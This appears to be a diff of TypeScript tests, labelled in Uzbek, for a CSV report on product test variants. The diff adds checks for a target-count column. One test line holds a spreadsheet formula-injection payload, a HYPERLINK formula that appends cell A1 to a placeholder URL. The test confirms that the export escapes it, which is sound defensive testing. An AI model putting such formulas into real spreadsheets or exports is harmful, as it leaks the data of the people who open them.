@@ -251,6 +251,11 @@ describeWithPostgres('BE-39 S1 va S3 sinovi hisoboti (PostgreSQL)', () => {
       amount: 378000,
     });
     expect(r.note).toMatch(/to‘xtatilmaydi/);
+    expect(r).toMatchObject({
+      targetAcceptedPerVariant: 400,
+      targetReached: false,
+    });
+    expect([s1All.targetReached, s1.targetReached]).toEqual([false, null]);
 
     const csv = await new VariantReportService(db, catalogFake as never).csv({
       from: '2027-01-10',
@@ -260,8 +265,10 @@ describeWithPostgres('BE-39 S1 va S3 sinovi hisoboti (PostgreSQL)', () => {
     const lines = csv.content.split('\r\n').filter(Boolean);
     expect(lines[0].startsWith('﻿Variant;Mahsulot ID;')).toBe(true);
     expect(lines).toHaveLength(6);
+    expect(lines[0].endsWith(';Maqsad 400 posilka')).toBe(true);
+    expect(lines[1].endsWith(';yetmadi')).toBe(true); // S1 jami: 1 ta qabul
     expect(lines[3]).toBe(
-      'S1;501;Simsiz quloqchinlar;10;4;0;0;3;2;2;1;0;189000;18900000;TOO_EXPENSIVE: 1',
+      'S1;501;Simsiz quloqchinlar;10;4;0;0;3;2;2;1;0;189000;18900000;TOO_EXPENSIVE: 1;',
     );
   });
 
@@ -324,7 +331,7 @@ describeWithPostgres('BE-39 S1 va S3 sinovi hisoboti (PostgreSQL)', () => {
     });
     const line = csv.content.split('\r\n').find((l) => l.startsWith('S3;501;'));
     expect(line).toBe(
-      `S3;501;"'=HYPERLINK(""http://x?""&A1;""bos"")";0;7;2;28,6;5;0;0;0;0;0;;`,
+      `S3;501;"'=HYPERLINK(""http://x?""&A1;""bos"")";0;7;2;28,6;5;0;0;0;0;0;;;`,
     );
     expect(csvCell('-1')).toBe("'-1");
     expect(csvCell('a\rb')).toBe('"a\rb"');
